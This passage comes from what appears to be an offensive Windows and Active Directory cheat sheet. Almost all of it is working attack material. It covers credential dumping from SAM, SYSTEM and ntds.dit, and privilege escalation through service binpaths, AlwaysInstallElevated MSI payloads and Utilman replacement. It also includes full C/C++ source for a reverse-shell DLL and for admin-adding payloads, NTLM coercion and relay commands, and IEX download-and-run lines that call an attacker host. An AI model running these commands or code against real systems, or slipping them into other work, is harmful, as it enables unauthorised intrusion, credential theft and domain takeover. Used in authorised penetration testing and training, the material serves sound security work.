enum4linux-ng -u '<USERNAME>' -p '<PASSWORD>' <RHOST>
```

### Evil-WinRM

```shell
evil-winrm -i <RHOST> -c /PATH/TO/CERTIFICATE/<CERTIFICATE>.crt -k /PATH/TO/PRIVATE/KEY/<KEY>.key -p <PASSWORD> -S
```

### JAWS

```cmd
IEX(New-Object Net.webclient).downloadString('http://<LHOST>:<LPORT>/jaws-enum.ps1')
```

### ldapsearch

```shell
ldapsearch -x -h <RHOST> -s base namingcontexts
ldapsearch -H ldap://<RHOST> -x -s base -b '' "(objectClass=*)" "*" +
ldapsearch -H ldaps://<RHOST>:636/ -x -s base -b '' "(objectClass=*)" "*" +
ldapsearch -x -H ldap://<RHOST> -D '' -w '' -b "DC=<RHOST>,DC=local"
ldapsearch -x -H ldap://<RHOST> -D '' -w '' -b "DC=<RHOST>,DC=local" | grep descr -A 3 -B 3
ldapsearch -x -h <RHOST> -b "dc=<RHOST>,dc=local" "*" | awk '/dn: / {print $2}'
ldapsearch -x -h <RHOST> -D "<USERNAME>" -b "DC=<DOMAIN>,DC=<DOMAIN>" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
ldapsearch -H ldap://<RHOST> -D <USERNAME> -w "<PASSWORD>" -b "CN=Users,DC=<RHOST>,DC=local" | grep info
```

### Microsoft Windows

#### Basic Microsoft Windows Enumeration

```cmd
whoami /all
systeminfo
net user
net user <USERNAME>
Get-LocalUser
Get-LocalGroup
Get-LocalGroupMember <GROUP>
Get-Process
tree /f C:\Users\
tasklist /SVC
sc query
sc qc <SERVICE>
netsh firewall show state
schtasks /query /fo LIST /v
wmic qfe get Caption,Description,HotFixID,InstalledOn
driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name', 'Start Mode', Path
```

#### Access Control

#### S-R-X-Y Example

| Value | Info |
| S | SID |
| R | Revision (always set to 1) |
| X | Identifier Authority (5 is the most common one) |
| Y | Sub Authority |

#### SID Table

| SID | Value |
| S-1-0-0 | Nobody |
| S-1-1-0 | Everybody |
| S-1-5-11 | Authenticated Users |
| S-1-5-18 | Local System |
| S-1-5-domainidentifier-500 | Administrator |

#### accesschk

#### Checking File Permissions

```cmd
.\accesschk.exe /accepteula -quvw "C:\PATH\TO\FILE\<FILE>.exe"
```

#### Checking Service Permissions

```cmd
.\accesschk.exe /accepteula -uwcqv <USERNAME> daclsvc
```

#### Checking Path Permissions to find Unquoted Service Paths

```cmd
.\accesschk.exe /accepteula -uwdq C:\
.\accesschk.exe /accepteula -uwdq "C:\Program Files\"
.\accesschk.exe /accepteula -uwdq "C:\Program Files\<UNQUOTED_SERVICE_PATH>"
```

#### Checking Registry Entries

```cmd
.\accesschk.exe /accepteula -uvwqk <REGISTRY_KEY>
```

#### Show hidden Files and Folders

```cmd
cmd /c dir /A      // show hidden folders
cmd /c dir /A:D    // show all hidden directories
cmd /c dir /A:H    // show all hidden files
powershell ls -force    // show all hidden files
```

#### Show installed Applications

```cmd
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

#### User Handling

#### Adding Users to Groups

```cmd
net localgroup "Remote Management Users" /add <USERNAME>
```

**Credential Harvesting**

#### Quick Wins

> https://twitter.com/NinjaParanoid/status/1516442028963659777?t=g7ed0vt6ER8nS75qd-g0sQ&s=09

> https://www.nirsoft.net/utils/credentials_file_view.html

```cmd
cmdkey /list
rundll32 keymgr.dll, KRShowKeyMgr
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
reg query HKCU\Software\SimonTatham\PuTTY\Sessions /t REG_SZ /s
reg query HKCU\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

#### Search for Passwords

```cmd
findstr /si password *.xml *.ini *.txt
dir .s *pass* == *.config
dir /s *pass* == *cred* == *vnc* == *.config*
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users\<USERNAME>\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.vbs -File -Recurse -ErrorAction SilentlyContinue
```

#### PowerShell History

```cmd
Get-History
(Get-PSReadlineOption).HistorySavePath
type C:\Users\%username%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

#### Saved Windows Credentials

```cmd
runas /savecred /user:<USERNAME> cmd.exe
```

#### Winlogon Credentials

#### Local Administrator Password Solution (LAPS)

```cmd
Get-ADComputer <RHOST> -property 'ms-mcs-admpwd'
```

#### Search the Registry for Passwords

```cmd
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

#### Dumping Credentials

```cmd
reg save hklm\system system
reg save hklm\sam sam
reg.exe save hklm\sam c:\temp\sam.save
reg.exe save hklm\security c:\temp\security.save
reg.exe save hklm\system c:\temp\system.save
```

#### Find KeePass Databases

#### Internet Information Service (IIS)

```cmd
C:\Windows\System32\inetsrv>appcmd.exe list apppool /@:*
```

#### PuTTY

#### Unattended Windows Installations

```shell
C:\Unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
```

#### Enable WinRM

```cmd
winrm quickconfig
```

#### Enable Remote Desktop (RDP)

```cmd
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group="remote desktop" new enable=yes
```

```cmd
Set-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0;
Set-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 1;
Enable-NetFirewallRule -DisplayGroup "Remote Desktop";
```

#### Privileges and Permissions

#### AlwaysInstallElevated

```cmd
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
reg query HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

```shell
msfvenom -p windows/meterpreter/reverse_tcp lhost=<LHOST> lport=<LPORT> -f msi > <FILE>.msi
```

```cmd
msiexec /quiet /qn /i <FILE>.msi
```

#### SeBackup and SeRestore Privilege

#### Backup SAM and SYSTEM Hashes

```cmd
reg save hklm\system C:\Users\<USERNAME>\system.hive
reg save hklm\sam C:\Users\<USERNAME>\sam.hive
```

#### Dumping Hashes

```shell
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
```

```shell
pypykatz registry --sam sam.hive system.hive
```

#### SeBackupPrivilege Privilege Escalation (diskshadow)

> https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug

#### Script for PowerShell Environment

```cmd
SET CONTEXT PERSISTENT NOWRITERSp
add volume c: alias foobarp
createp
expose %foobar% z:p
```

```cmd
diskshadow /s <FILE>.txt
```

#### Copy ntds.dit

```cmd
Copy-FileSebackupPrivilege z:\Windows\NTDS\ntds.dit C:\temp\ndts.dit
```

#### Export System Registry Value

```cmd
reg save HKLM\SYSTEM c:\temp\system
```

#### Extract the Hashes

```shell
impacket-secretsdump -sam sam -system system -ntds ntds.dit LOCAL
```

#### Alternative Way via Robocopy

```cmd
reg save hklm\sam C:\temp\sam
reg save hklm\system C:\temp\system
```

```cmd
set metadata C:\Windows\temp\meta.cabX
set context clientaccessibleX
set context persistentX
begin backupX
add volume C: alias cdriveX
createX
expose %cdrive% E:X
end backupX
```

```cmd
diskshadow /s script.txt
robocopy /b E:\Windows\ntds . ntds.dit
```

#### SeEnableDelegationPrivilege

> https://github.com/Kevin-Robertson/Powermad

> https://github.com/dirkjanm/krbrelayx

> https://github.com/topotam/PetitPotam

```shell
netexec ldap <RHOST> -u '<USERNAME>' -p <PASSWORD> -M maq
```

#### Example 1

```cmd
New-MachineAccount -MachineAccount <MACHINE_ACCOUNT> -Password $(ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force)
```

```cmd
Set-MachineAccountAttribute -MachineAccount <MACHINE_ACCOUNT> -Attribute useraccountcontrol -Value 528384
```

```cmd
Set-MachineAccountAttribute -MachineAccount <MACHINE_ACCOUNT> -Attribute ServicePrincipalName -Value http/<RHOST> -Append
```

```cmd
Get-MachineAccountAttribute -MachineAccount <MACHINE_ACCOUNT> -Attribute ServicePrincipalName -Verbose
```

```shell
python3 dnstool.py -u '<DOMAIN>\<MACHINE_ACCOUNT>$' -p <PASSWORD> -r <RHOST> -d <LHOST> --action add -dns-ip <RHOST> <RHOST>
```

```shell
iconv -f ASCII -t UTF-16LE <(printf '<PASSWORD>') | openssl dgst -md4
```

```shell
python3 krbrelayx.py -hashes :<NTLM_HASH> --target <RHOST>
```

```shell
python3 printerbug.py -hashes :<NTLM_HASH> <DOMAIN>/'<MACHINE_ACCOUNT>$'@<RHOST> <RHOST>
```

```shell
impacket-secretsdump -k <RHOST> -just-dc-ntlm
```

#### Example 2

```shell
impacket-addcomputer -dc-ip <RHOST> -computer-name <MACHINE_ACCOUNT> -computer-pass <PASSWORD> <DOMAIN>/<USERNAME>:<PASSWORD>
```

```shell
python3 dnstool.py -u '<DOMAIN>\<MACHINE_ACCOUNT>$' -p <PASSWORD> -r <RHOST> -d <LHOST> --action add <RHOST> -dns-ip <RHOST>
```

```shell
dnstool.py -u '<DOMAIN>\<MACHINE_ACCOUNT>$' -p '<PASSWORD>' --action add --record <RHOST> --data <LHOST> --type A -dns-ip <RHOST> <RHOST>
```

```shell
python3 addspn.py -u '<DOMAIN>/<USERNAME>' -p '<PASSWORD>' -s 'cifs/<RHOST>' -t '<MACHINE_ACCOUNT>$' -dc-ip <RHOST> <RHOST> --additional
```

```shell
python3 addspn.py -u '<DOMAIN>/<USERNAME>' -p '<PASSWORD>' -s 'cifs/<RHOST>' -t '<MACHINE_ACCOUNT>$' -dc-ip <RHOST> <RHOST>
```

```shell
python -c "password = '<PASSWORD>'; import hashlib; print(hashlib.new('md4', password.encode('utf-16le')).hexdigest())"
```

```shell
python3 PetitPotam.py -u '<MACHINE_ACCOUNT>$' -p '<PASSWORD>' <RHOST> <RHOST>
```

```shell
netexec smb <RHOST> -u '<MACHINE_ACCOUNT>$' -p '<PASSWORD>' -M coerce_plus
```

```shell
netexec smb <RHOST> -u '<MACHINE_ACCOUNT>$' -p '<PASSWORD>' -M coerce_plus -o LISTENER=<RHOST> METHOD=PrinterBug
```

#### SeLoadDriverPrivilege

```cmd
sc.exe query
$services=(get-service).name | foreach {(Get-ServiceAcl $_)  | where {$_.access.IdentityReference -match 'Server Operators'}}
```

```cmd
sc.exe config VSS binpath="C:\temp\nc64.exe -e cmd <LHOST> <LPORT>"
sc.exe stop VSS
sc.exe start VSS
```

#### SeManageVolumePrivilege

> https://github.com/CsEnox/SeManageVolumeExploit

#### Grant full Permission on C:\ Drive

```cmd
.\SeManageVolumeExploit
```

#### Overwriting "Printconfig.dll" for SYSTEM Shell Access

1. Generate a custom DLL and locate it at `C:\Windows\System32\spool\drivers\x64\3\Printconfig.dll`.
2. Initiate the `PrintNotify` object by executing the following PowerShell commands:

```cmd
$type = [Type]::GetTypeFromCLSID("{854A20FB-2D44-457D-992F-EF13785D2B51}")
```

```cmd
$object = [Activator]::CreateInstance($type)
```

3. Attain a system shell access.

**Golden Ticket**

```cmd
certutil -store My
```

```cmd
certutil -exportPFX My 75b2f4bbd71f108945247b466161bdph <FILE>.pfx
```

```shell
certipy-ad forge -ca-pfx '<FILE>.pfx' -upn 'Administrator@<DOMAIN>' -subject 'CN=Administrator,CN=Users,DC=<DOMAIN>,DC=<DOMAIN>'
```

```shell
certipy-ad auth -pfx administrator_forged.pfx -dc-ip <RHOST>
```

#### SeTakeOwnershipPrivilege

```cmd
takeown /f C:\Windows\System32\Utilman.exe
```

```cmd
icacls C:\Windows\System32\Utilman.exe /grant Everyone:F
```

```cmd
C:\Windows\System32\> copy cmd.exe utilman.exe
```

Click the `Ease of Access` button on the logon screen to get a shell with `NT Authority\System` privileges.

#### SeImpersonate and SeAssignPrimaryToken Privilege

> https://github.com/antonioCoco/RogueWinRM

```cmd
.\RogueWinRM.exe -p "C:\> .\nc64.exe" -a "-e cmd.exe <LHOST> <LPORT>"
```

#### DLL Hijacking

#### Standard Search Order

1. The directory from which the application loaded.
2. The system directory.
3. The 16-bit system directory.
4. The Windows directory.
5. The current directory.
6. The directories that are listed in the PATH environment variable.

```cmd
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
icacls .\PATH\TO\BINARY\<BINARY>.exe
Restart-Service <SERVICE>
$env:path
```

#### DLL Abuse

#### customdll.cpp

**Example 1**

```cpp
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
        i = system ("net user <USERNAME> <PASSWORD> /add");
        i = system ("net localgroup administrators <USERNAME> /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```

#### Compiling customdll.cpp

```shell
x86_64-w64-mingw32-gcc customdll.cpp --shared -o customdll.dll
```

Copy the `.dll` file to the desired path.

```cmd
Get-LocalGroupMember administrators
```

**Example 2**

```cpp
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#pragma comment(lib,"ws2_32")

extern "C" __declspec(dllexport) void OptionalFunction()
{
    WSADATA wsaData;
    SOCKET Winsock;
    struct sockaddr_in hax;
    char ip_addr[16] = "<LHOST>";
    char port[6] = "<LPORT>";
    STARTUPINFO ini_processo;
    PROCESS_INFORMATION processo_info;

    WSAStartup(MAKEWORD(2, 2), &wsaData);
    Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

    struct hostent *host;
    host = gethostbyname(ip_addr);
    strcpy_s(ip_addr, 16, inet_ntoa(*((struct in_addr *)host->h_addr)));

    hax.sin_family = AF_INET;
    hax.sin_port = htons(atoi(port));
    hax.sin_addr.s_addr = inet_addr(ip_addr);

    WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);

    memset(&ini_processo, 0, sizeof(ini_processo));
    ini_processo.cb = sizeof(ini_processo);
    ini_processo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;

    TCHAR cmd[255] = TEXT("cmd.exe");
    CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        // If the service only loads the DLL without explicitly calling OptionalFunction,
        // uncomment the next line to fire the shell as soon as the DLL is mapped:
        // OptionalFunction();
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

**Compiling customdll.cpp**

```shell
x86_64-w64-mingw32-gcc -shared -o customdll.dll customdll.cpp -lws2_32
i686-w64-mingw32-gcc -shared -o customdll.dll customdll.cpp -lws2_32
```

#### Leveraging Windows Services

#### Running Services Enumeration

#### Service Configuration Enumeration

```cmd
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like '<SERVICE>'}
```

#### Permission Table

| Mask | Permissions |
| F | Full access |
| M | Modify access |
| RX | Read and execute access |
| R | Read-only access |
| W | Write-only access |

#### Permission Enumeration

```cmd
icacls "C:\PATH\TO\BINARY\<BINARY>"
```

#### Permissions Abuse

#### adduser.c

```c
#include <stdlib.h>

int main ()
{
  int i;

  i = system ("net user <USERNAME> <PASSWORD> /add");
  i = system ("net localgroup administrators <USERNAME> /add");

  return 0;
}
```

#### Compiling

```shell
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```

**Execution**

```cmd
net stop <SERVICE>
net start <SERVICE>
```

```cmd
shutdown /r /t 0
```

#### PowerView Example

```cmd
Get-ModifiableServiceFile
Install-ServiceBinary -Name '<SERVICE>'
```

#### Service Execution Properties Enumeration

```cmd
$ModifiableFiles = echo 'C:\PATH\TO\BINARY\<BINARY>.exe' | Get-ModifiablePath -Literal
$ModifiableFiles
$ModifiableFiles = echo 'C:\PATH\TO\BINARY\<BINARY>.exe argument' | Get-ModifiablePath -Literal
$ModifiableFiles = echo 'C:\PATH\TO\BINARY\<BINARY>.exe argument -conf=C:\temp\path' | Get-ModifiablePath -Literal
```

#### Unquoted Service Paths

#### Search Order

```shell
C:\example.exe
C:\Program Files\example.exe
C:\Program Files\my example\example.exe
C:\Program Files\my example\my example\example.exe
```

#### Service Path Enumeration

Place a `.exe` file in the desired folder, then `start` or `restart` the `service`.

```cmd
Get-CimInstance -ClassName win32_service | Select Name,State,PathName
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
Start-Service <SERVICE>
Stop-Service <SERVICE>
icacls "C:\"
icacls "C:\Program Files"
icacls "C:\Program Files\my example"
```

**PowerView Example**

```cmd
Get-UnquotedService
Write-ServiceBinary -Name '<SERVICE>' -Path "C:\Program Files\my example\example.exe"
```

#### Scheduled Tasks Enumeration

Place a `.exe` file in the desired folder and wait for the `scheduled task` to get `executed`.

```cmd
icacls C:\PATH\TO\BINARY\<BINARY>.exe
```

#### writeDACL

> https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/

```cmd
$SecPassword = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USERNAME>', $SecPassword)
Add-ObjectACL -PrincipalIdentity <USERNAME> -Credential $Cred -Rights DCSync
```

### NTLM

#### NTLM Hash Conversion

```python
python3 -c 'import hashlib; print(hashlib.new("md4","<PASSWORD>".encode("utf-16le")).hexdigest())'
```

#### Unauthenticated

#### LLMNR/mDNS/NBNS Poisoning

#### Capture

```shell
sudo responder -I eth0
sudo responder -I eth0 -A
sudo responder -I eth0 -W
```

#### Relay

```shell
python ntlmrelayx.py -smb2support -t <RHOST>
python ntlmrelayx.py -6 -smb2support -t <RHOST>
```

#### DHCPv6 Spoofing

**Capture**

```shell
mitm6 -d <DOMAIN> -hb <LHOST>
```

**Relay**

#### PetitPotam

**Capture**

```shell
python PetitPotam.py <LHOST> <RHOST>
```

```shell
netexec smb <RHOST> -M coerce_plus -M Petitpotam -L <LHOST>
```

**Relay**

#### Authenticated

**PetitPotam**

**Capture**

```shell
python PetitPotam.py -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' <LHOST> <RHOST>
```

```shell
netexec smb <RHOST> -u <USERNAME> -p '<PASSWORD>' -M coerce_plus -M Petitpotam -L <LHOST>
```

**Relay**

#### DFSCoerce

**Capture**

```shell
python dfscoerce.py -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' <LHOST> <RHOST>
```

```shell
netexec smb <RHOST> -u <USERNAME> -p '<PASSWORD>' -M coerce_plus -M DFSCoerce -L <LHOST>
```

**Relay**

#### ShadowCoerce

**Capture**

```shell
python shadowcoerce.py -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' <LHOST> <RHOST>
```

```shell
netexec smb <RHOST> -u <USERNAME> -p '<PASSWORD>' -M coerce_plus -M ShadowCoerce -L <LHOST>
```

**Relay**

#### PrinterBug

**Capture**

```shell
responder -I eth0 -A
python printerbug.py '<DOMAIN>/<USERNAME>':'<PASSWORD>'@'<RHOST>' <LHOST>
```

```shell
netexec smb <RHOST> -u <USERNAME> -p '<PASSWORD>' -M coerce_plus -M Printerbug -L <LHOST>
```

**Relay**

#### MSEven (CheeseOunce)

**Capture**

```shell
python cheese.py '<DOMAIN>/<USERNAME>':'<PASSWORD>'@'<RHOST>' <LHOST>
```

```shell
netexec smb <RHOST> -u <USERNAME> -p '<PASSWORD>' -M coerce_plus -M MSEven -L <LHOST>
```

**Relay**

#### WebDAV Coercion

**Prerequisites**

#### Check for WebClient Service

```shell
webclientservicescanner '<DOMAIN>/<USERNAME>':'<PASSWORD>'@'<RHOST>'
```

```shell
netexec smb <RHOST> -u <USERNAME> -p '<PASSWORD>' -M webdav
```

#### Get a NetBIOS Name

**LLMNR/mDNS/NBNS Poisoning**

```shell
sudo responder -I eth0 -w
```

#### ADIDNS Poisoning

```shell
python dnstool.py -u '<DOMAIN>\<USERNAME>' -p '<PASSWORD>' -a add -r '<DOMAIN>' -d <LHOST> <RHOST>
```

#### PetitPotam via WebDAV

**Capture**

**LLMNR/mDNS/NBNS Poisoning**

```shell
python PetitPotam.py -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' 'UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA@80/foobar' <RHOST>
```

**ADIDNS Poisoning**

**Relay**

**LLMNR/mDNS/NBNS Poisoning**

```shell
python ntlmrelayx.py --no-smb-server -t <RHOST>
```

**ADIDNS Poisoning**

```shell
python ntlmrelayx.py -t <RHOST> --no-smb-server
python PetitPotam.py -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' 'UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAAt@80/foobar' <RHOST>
```

#### DFSCoerce via WebDAV

**Capture**

**LLMNR/mDNS/NBNS Poisoning**

```shell
python dfscoerce.py -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' 'UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA@80/foobar' <RHOST>
```

**ADIDNS Poisoning**

**Relay**

**LLMNR/mDNS/NBNS Poisoning**

```shell
python dfscoerce.py -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' 'bogus@80/foobar' <RHOST>
```

**ADIDNS Poisoning**

### PKINITtools

```shell
python3 gettgtpkinit.py -cert-pfx <USERNAME>.pfx -dc-ip <RHOST> <DOMAIN>/<USERNAME> <USERNAME>.ccache
python3 getnthash.py <DOMAIN>/<USERNAME> -key <KEY>
```

**Error Handling**

#### Fixing socket ssl wrapping error: [Errno 104] Connection reset by peer Error

> https://takraw-s.medium.com/fix-errors-socket-ssl-wrapping-error-errno-104-connection-reset-by-peer-9c63c551cd7

> https://github.com/fortra/impacket/issues/581

```shell
sudo vi /etc/ssl/openssl.cnf
```

change

```shell
[system_default_sect]
MinProtocol = TLSv1.2
CipherString = DEFAULT:@SECLEVEL=2
```

to

```shell
MinProtocol = TLSv1.0
CipherString = DEFAULT:@SECLEVEL=1
```

Alternatively you can create your own `openssl.cnf` and `export` the path to it.

```shell
export OPENSSL_CONF=/PATH/TO/FOLDER/openssl.cnf
```

### RunasCs

```cmd
.\RunasCs.exe <USERNAME> <PASSWORD> cmd.exe -r <LHOST>:<LPORT>
.\RunasCs.exe <USERNAME> <PASSWORD> cmd.exe -r <LHOST>:<LPORT> --bypass-uac
.\RunasCs.exe <USERNAME> <PASSWORD> cmd.exe -r <LHOST>:<LPORT> --bypass-uac -l 5 -b
.\RunasCs.exe <USERNAME> <PASSWORD> <FILE> --bypass-uac -l 5 -b
.\RunasCs.exe -d <DOMAIN> "<USERNAME>" '<PASSWORD>' cmd.exe -r <LHOST>:<LPORT>
.\RunasCs.exe -l 3 -d <DOMAIN> "<USERNAME>" '<PASSWORD>' 'C:\Users\<USERNAME>\Downloads\<FILE>'
```

### RustHound-CE

```shell
rusthound-ce -d <DOMAIN> -f <RHOST> -k -c All --zip
rusthound-ce -u '<USERNAME>' -p '<PASSWORD>' -d <DOMAIN> -f <RHOST> -k -c All --zip
```

### Shadow Credentials

```shell
python3 pywhisker.py -d '<DOMAIN>' -u '<USERNAME>' -p '<PASSWORD>' --target '<OBJECT>' --action 'list'
```

```shell
python3 pywhisker.py -d '<DOMAIN>' -u '<USERNAME>' -p '<PASSWORD>' --target '<OBJECT>' --action 'info' --device-id <ID>
```

```shell
python3 pywhisker.py -d '<DOMAIN>' -u '<USERNAME>' -p '<PASSWORD>' --target '<OBJECT>' --action 'add' --filename <OBJECT>
```

```shell
python3 gettgtpkinit.py <DOMAIN>/<USERNAME> -cert-pfx <USERNAME>.pfx -pfx-pass '<PASSWORD>' <USERNAME>.ccache
```

```shell
python3 getnthash.py <DOMAIN>/<USERNAME> -key <KEY>
```

```shell
pth-net rpc password '<USERNAME>' '<PASSWORD>' -U '<DOMAIN>'/'<USERNAME>'%'<HASH>':'<HASH>' -S '<RHOST>'
```

```shell
python3 dacledit.py -action 'write' -rights 'FullControl' -principal '<USERNAME>' -target-dn 'CN=<GROUP>,CN=<GROUP>,DC=<DOMAIN>,DC=<DOMAIN>' '<DOMAIN>/<USERNAME>:<PASSWORD>'
```

```shell
net rpc group addmem '<GROUP>' '<USERNAME>' -U '<DOMAIN>'/'<USERNAME>'%'<PASSWORD>' -S '<RHOST>'
```

```shell
bloodyAD --host <RHOST> -d '<DOMAIN>' -u '<USERNAME>' -p '<PASSWORD>' get object <GROUP> --attr member
```

```shell
bloodyAD -d <DOMAIN> -u '<USERNAME>' -k ccache=<FILE>.ccache --host <HOSTNAME> --dc-ip <RHOST> add shadowCredentials '<USERNAME>'
```

```shell
openssl pkcs12 -export -in <CERT>.pem -inkey <FILE>.pem -out <FILE>.pfx -passout pass:
```

```shell
certipy-ad auth -pfx <FILE>.pfx -dc-ip <RHOST> -domain <DOMAIN> -username '<USERNAME>'
```

### Titanis

> https://github.com/trustedsec/Titanis

#### Installation

> https://gist.github.com/Flangvik/<NTLM_HASH>

#### Upgrade .NET SDK to Version 8

#### Remove old .NET SDK

```shell
sudo apt-get remove --purge dotnet-sdk-6.0
```

#### Install .NET 8 SDK system-wide to /usr/share/dotnet

```shell
curl -sSL https://dot.net/v1/dotnet-install.sh | sudo bash -s -- --channel 8.0 --install-dir /usr/share/dotnet
```

#### Symlink dotnet Binary so it's available on PATH

```shell
sudo ln -sf /usr/share/dotnet/dotnet /usr/local/bin/dotnet
```

#### Set DOTNET_ROOT globally for all Users

```shell
echo 'export DOTNET_ROOT=/usr/share/dotnet' | sudo tee /etc/profile.d/dotnet.sh
```

#### Install Titanis

#### Download, extract, and set up all Titanis Tools in /opt/titanis

```shell
curl -sL https://github.com/trustedsec/Titanis/releases/download/v0.9.178/Titanis-tools-linux-x64-net8.zip -o /tmp/titanis.zip && sudo mkdir -p /opt/titanis && sudo unzip -o /tmp/titanis.zip -d /opt/titanis/ && rm /tmp/titanis.zip
```

#### Make each Tool executable and symlink to /usr/bin for easy Access

```shell
for tool in CredCoerce Epm Kerb Lsa Sam Scm Smb2Client Wmi; do sudo chmod +x /opt/titanis/linux-x64/$tool/$tool && sudo ln -sf /opt/titanis/linux-x64/$tool/$tool /usr/bin/$tool; done
```

#### CredCoerce

Coerce a target system into authenticating outbound to a controlled listener via MS-EFSR RPC calls (PetitPotam-style). Useful for NTLM relay and hash capture.

```shell
CredCoerce -u <USERNAME> -p '<PASSWORD>' -Techniques * <RHOST> '\\<LHOST>\<SHARE>'
CredCoerce -u <USERNAME> -p '<PASSWORD>' -Techniques Efs.OpenFile <RHOST> '\\<LHOST>\<SHARE>'
CredCoerce -u <USERNAME> -p '<PASSWORD>' -Techniques Efs.EncryptFile <RHOST> '\\<LHOST>\<SHARE>'
CredCoerce -u <USERNAME> -p '<PASSWORD>' -Techniques Efs.DecryptFile <RHOST> '\\<LHOST>\<SHARE>'
CredCoerce -NtlmHash <HASH> -Techniques * <RHOST> '\\<LHOST>\<SHARE>'
CredCoerce -Kdc <RHOST> -AesKey <KEY> -Techniques * <RHOST> '\\<LHOST>\<SHARE>'
```

#### Kerb

Request and manage Kerberos tickets, change passwords, generate protocol keys, and inspect ticket files.

#### asreq

- Request a TGT

```shell
Kerb asreq -Realm <DOMAIN> -Password '<PASSWORD>' -OutputFileName <USERNAME>.kirbi -Overwrite <USERNAME> <RHOST>
Kerb asreq -Realm <DOMAIN> -NtlmHash <HASH> -OutputFileName <USERNAME>.kirbi -Overwrite <USERNAME> <RHOST>
Kerb asreq -Realm <DOMAIN> -AesKey <KEY> -OutputFileName <USERNAME>.kirbi -Overwrite <USERNAME> <RHOST>
Kerb asreq -Realm <DOMAIN> -Password '<PASSWORD>' -EncTypes Rc4Hmac -OutputFileName <USERNAME>.kirbi -Overwrite <USERNAME> <RHOST>
```

#### getasinfo

- Enumerate Encryption Types / Validate Usernames

```shell
Kerb getasinfo <USERNAME>@<DOMAIN> <RHOST>
Kerb getasinfo -Realm <DOMAIN> <USERNAME> <RHOST>
```

#### tgsreq

- Request a Service Ticket / Kerberoasting

```shell
Kerb tgsreq -Tgt <USERNAME>.kirbi -OutputFileName <USERNAME>-<RHOST>.kirbi <RHOST> cifs/<RHOST>
Kerb tgsreq -Tgt <USERNAME>.kirbi -OutputFileName <USERNAME>-<RHOST>.kirbi <RHOST> cifs/<RHOST> HOST/<RHOST>
Kerb tgsreq -Tgt <USERNAME>.kirbi -EncTypes Rc4Hmac <RHOST> <SPN> -OutputFields TgsrepHashcatMethod,TicketHash
```

#### renew

